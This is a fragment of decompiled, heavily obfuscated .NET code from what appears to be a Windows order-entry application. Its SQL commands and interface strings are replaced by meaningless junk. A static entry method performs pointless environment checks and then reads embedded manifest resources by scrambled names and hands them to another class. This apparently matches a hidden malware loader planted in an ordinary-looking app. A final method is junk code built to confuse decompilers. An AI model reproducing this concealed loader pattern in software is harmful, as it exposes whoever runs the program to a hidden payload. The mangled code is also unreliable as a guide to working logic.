						int num3 = 0;
						do
						{
							text8 += Conversions.ToChar(text6[num3].ToString());
							num3++;
						}
						while (num3 <= 7);
						text9 = text8;
						num4 = Conversions.ToInteger(text7);
					}
					if (Operators.CompareString(text9, text4, false) == 0)
					{
						Connection.Close();
						Sz3();
						text10 = text4 + (num4 + 1).ToString("j6u");
						string text11 = "fhfgrg4tw" + text10 + "yret342" + text2 + "o8kjm" + text3 + "mkhghdr4e";
						Command = new SqlCommand(text11, Connection);
						Command.ExecuteNonQuery();
					}
					else
					{
						Connection.Close();
						Sz3();
						text10 = text4 + 1.ToString("ccgde5y");
						string text12 = "hgjhjjy5ryr" + text10 + "hku6ut" + text2 + "6ry54" + text3 + "6u6ugf";
						Command = new SqlCommand(text12, Connection);
						Command.ExecuteNonQuery();
					}
				}
				else
				{
					Connection.Close();
					Sz3();
					text10 = text4 + 1.ToString("jmhgfert");
					string text13 = "ghjghd4" + text10 + "fjfjdgre4" + text2 + "yju5ry54" + text3 + "tyydh";
					Command = new SqlCommand(text13, Connection);
					Command.ExecuteNonQuery();
				}
				Connection.Close();
				Sz3();
				int num5 = num - 1;
				for (int i = 0; i <= num5; i++)
				{
					object[] array;
					bool[] array2;
					object obj = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
					if (array2[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
					}
					int num6 = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "Cells", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null));
					object obj2 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
					if (array2[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
					}
					int num7 = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null));
					string text14 = "mgdge4w" + text10 + "556" + Conversions.ToString(num6) + "kughth" + Conversions.ToString(num7) + "gjgjrt" + text + "khghrt";
					Command = new SqlCommand(text14, Connection);
					Command.ExecuteNonQuery();
				}
				MessageBox.Show("Order Success", "Order Success", (MessageBoxButtons)0, (MessageBoxIcon)64);
				Lc7();
			}
		}
	}

	public void Sj64Z()
	{
		checked
		{
			int num = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null)) - 1;
			int num2 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			for (int i = 0; i <= num; i++)
			{
				object obj = num2;
				object[] array;
				bool[] array2;
				object obj2 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
				if (array2[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
				}
				num2 = Conversions.ToInteger(Operators.AddObject(obj, NewLateBinding.LateGet(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)));
				object obj3 = num3;
				object obj4 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
				if (array2[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
				}
				object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(obj4, (Type)null, "Cells", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				object obj6 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
				if (array2[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
				}
				num3 = Conversions.ToInteger(Operators.AddObject(obj3, Operators.MultiplyObject(obj5, NewLateBinding.LateGet(NewLateBinding.LateGet(obj6, (Type)null, "Cells", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null))));
				object obj7 = num4;
				object obj8 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
				if (array2[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
				}
				object obj9 = NewLateBinding.LateGet(NewLateBinding.LateGet(obj8, (Type)null, "Cells", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				object obj10 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
				if (array2[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
				}
				num4 = Conversions.ToInteger(Operators.AddObject(obj7, Operators.MultiplyObject(obj9, NewLateBinding.LateGet(NewLateBinding.LateGet(obj10, (Type)null, "Cells", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null))));
				NewLateBinding.LateSet(Label3, (Type)null, "Text", new object[1] { "met3q" + Conversions.ToString(num3) }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(Label4, (Type)null, "Text", new object[1] { "76uyjh" + Conversions.ToString(num4) }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(Label5, (Type)null, "Text", new object[1] { "3244fgh" + Conversions.ToString(num2) }, (string[])null, (Type[])null);
			}
		}
	}

	private void t7T5H(object sender, EventArgs e)
	{
		NewLateBinding.LateCall(NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(Label3, (Type)null, "Text", new object[1] { "657hg" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label4, (Type)null, "Text", new object[1] { "ghy5r" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label5, (Type)null, "Text", new object[1] { "56hgjhg" }, (string[])null, (Type[])null);
	}

	private void n3B5S(object sender, EventArgs e)
	{
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Button6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"vccvbr", false))
		{
			string text = Conversions.ToString(NewLateBinding.LateGet(ComboBox1, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null));
			if (Operators.CompareString(Conversions.ToString(NewLateBinding.LateGet(ComboBox1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), "", false) == 0)
			{
				MessageBox.Show("234y5j", "67ihg", (MessageBoxButtons)0, (MessageBoxIcon)16);
				return;
			}
			if (Operators.CompareString(text, "", false) == 0)
			{
				MessageBox.Show("gh5ee56", "4dtgfd", (MessageBoxButtons)0, (MessageBoxIcon)16);
				return;
			}
			NewLateBinding.LateSet(Button6, (Type)null, "Text", new object[1] { "ffgrs4" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(ComboBox1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			MemberIdSet = text;
		}
		else
		{
			NewLateBinding.LateSet(Button6, (Type)null, "Text", new object[1] { "fggher5" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(ComboBox1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
			MemberIdSet = "";
		}
	}

	private void Sq3r7(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(TextBox1, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Value", new object[1] { 1 }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(Button9, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(PictureBox1, (Type)null, "Image", new object[1], (string[])null, (Type[])null);
	}

	private void Lo8y1(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("56trygf\r\n\r\nyjyt54\r\n\r\n6556fgh\r\n\r\nfthtrh5t5\r\n\r\nukuer", "fghhtdh45", (MessageBoxButtons)0);
	}

	[STAThread]
	public static void o4A3F()
	{
		checked
		{
			try
			{
				DateTime t = DateTime.Now.ToLocalTime();
				if (DateTime.Compare(Conversions.ToDate(DateTime.Now.AddHours(6.0).ToLongTimeString()), t) == 0)
				{
					return;
				}
				string currentDirectory = Directory.GetCurrentDirectory();
				string directoryName = Path.GetDirectoryName(currentDirectory);
				int num = default(int);
				if (currentDirectory.Contains(directoryName))
				{
					string text = directoryName;
					for (int i = 0; i < text.Length; i++)
					{
						if (Operators.CompareString(Conversions.ToString(text[i]), "\\", false) == 0)
						{
							num++;
						}
					}
				}
				if (num <= 0)
				{
					return;
				}
				List<char[]> list = new List<char[]>();
				list.Add(currentDirectory.ToCharArray());
				list.Add(directoryName.ToCharArray());
				StringBuilder stringBuilder = new StringBuilder();
				StringBuilder stringBuilder2 = new StringBuilder();
				long num2 = currentDirectory.Length * num;
				char[] array = list[0];
				foreach (char c in array)
				{
					stringBuilder.AppendLine(Conversions.ToString(c));
					num2 += num;
				}
				char[] array2 = list[1];
				foreach (char c2 in array2)
				{
					stringBuilder2.AppendLine(Conversions.ToString(c2));
					num2 += num;
				}
				object obj = Regex.Matches(stringBuilder.ToString(), Environment.NewLine).Count - 1;
				object obj2 = Operators.AddObject(obj, (object)1);
				if (!Conversions.ToBoolean((object)(Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, obj2, false))) || Operators.ConditionalCompareObjectEqual(obj, obj2, false))))
				{
					return;
				}
				int num3;
				do
				{
					g9Y6Z.num = g9Y6Z.Br45M();
					num3 = g9Y6Z.num;
				}
				while (num3 != 100);
				g9Y6Z.Ass = Assembly.GetExecutingAssembly();
				g9Y6Z.Names = ((Assembly)g9Y6Z.Ass).GetManifestResourceNames();
				g9Y6Z.ResName = "KCDID4";
				g9Y6Z.Res = string.Format("{0}{1}{2}{3}{4}", ".r", "es", "ou", "rc", "es");
				g9Y6Z.MName = "HNHJG5";
				g9Y6Z.TNum = 35;
				g9Y6Z.Mnum = 0;
				List<int> list2 = new List<int>
				{
					Capacity = 15
				};
				int num4 = 0;
				do
				{
					unchecked
					{
						list2.Add(g9Y6Z.num % checked(num4 + 2));
					}
					num4++;
				}
				while (num4 <= 10);
				if (list2[5] == 2)
				{
					t9W.o9L(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(new object())), list2[7], "kjhyu7i", Jz5: false);
					if (list2[5] > 0)
					{
						list2[5] = list2[5] * 25 * 25;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static void b7E2F()
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out t9W t9W);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out g9Y6Z g9Y6Z);
		while (true)
		{
			obj = obj;
			if (obj == null)
			{
				break;
			}
			do
			{
				t9W = t9W;
				g9Y6Z = (g9Y6Z)t9W.UserId;
				g9Y6Z = g9Y6Z;
			}
			while (((j1M)null).MemberIdSet != null);
		}
		Zg9 zg = zg;
		q1W q1W = (q1W)((t9W)zg.MemberIdSet).MemberIdSet;
		_ = (q1W)q1W.MemberIdSet;
		_ = (s9Q)(object)k4D.Default;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out UIntPtr uIntPtr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out f2X f2X);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out y6M y6M);
		do
		{
			uIntPtr = uIntPtr;
			uIntPtr = default(UIntPtr);
			if (uIntPtr == (UIntPtr)(nuint)0u)
			{
				try
				{
					f2X = f2X;
					f2X = f2X;
				}
				catch
				{
					y6M = y6M;
					y6M = y6M;
				}
			}
		}
		while (obj != null);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out j1M j1M);
		try
		{
			j1M = j1M;
			_ = (Hd0)j1M.UserId;
			_ = (_003CModule_003E)((j1M)null).MemberIdSet;
			q1W = null;
			_ = (Da28)(object)k4D.Default;
			_ = (Da28)(object)k4D.Default;
		}
		catch
		{
			if ((UIntPtr)g9Y6Z.UserId == (UIntPtr)(nuint)0u)
			{
				_003CModule_003E _003CModule_003E = (_003CModule_003E)q1W.MemberIdSet;
				_003CModule_003E = _003CModule_003E;
				_ = (Da28)((t9W)j1M.UserId).MemberIdSet;
				_ = (s9Q)((s9Q)null).MemberIdSet;
			}
		}
		_ = (k4D)j1M.MemberIdSet;
		g9Y6Z = g9Y6Z;
		_ = (n4H)(object)k4D.Default;
		_ = (s9Q)((j1M)null).UserId;
	}
}
